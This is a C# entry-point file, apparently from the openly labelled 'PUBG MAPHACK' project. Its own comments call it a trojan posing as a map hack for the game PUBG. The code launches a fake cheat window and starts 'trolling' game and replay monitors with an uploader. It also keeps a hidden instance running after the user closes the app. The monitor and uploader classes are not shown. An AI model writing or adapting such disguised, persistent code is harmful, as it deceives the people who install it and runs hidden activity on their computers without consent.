using System;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;

namespace PUBG_MAPHACK
{
    static class Program
    {

        static public Boolean debug = false;
        static public string triggerTracker = "";

        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            if (Directory.Exists("debug"))
            {
                debug = true;
            }

            // Let's start our trojan if it's not already running in background
            Process[] isAlreadyInitialized = Process.GetProcessesByName("PUBG MAPHACK");
            if (isAlreadyInitialized.Length == 1 || !Directory.Exists("x86"))
            {
                // Start our game monitor & let the trolling begin!
                new GameMonitor();

                // Start our replay monitor & uploader
                new ReplayMonitor();
            }

            if (Directory.Exists("x86"))
            {
                // Run fake cheat application
                Application.Run(new fake_cheat());

                /* Run this hidden win form in background if user closes main application window.
                 * This keeps the trojan alive until reboot or manual shutdown in process list */
                System.Windows.Forms.MessageBox.Show("Hidden instance of pubg maphack is still running (check processes)", "Developer helper", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Information);
                Application.Run(new hidden());
            }
            else
            {
                System.Windows.Forms.MessageBox.Show("Make sure folder x86 is located in the same location as pubg maphack.exe (x86 can be found in pubg_maphack.zip)", "Error - x86 Missing", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error);
            }

        }

        public static void debug_log(string message)
        {
            if(debug == true)
            {
                using (StreamWriter sw = File.AppendText(@"debug\debug.txt"))
                {
                    sw.WriteLine(DateTime.Now.ToString("yyyy-MM-dd HH:mm") + " | " + message);
                }
            }
        }

    }
}
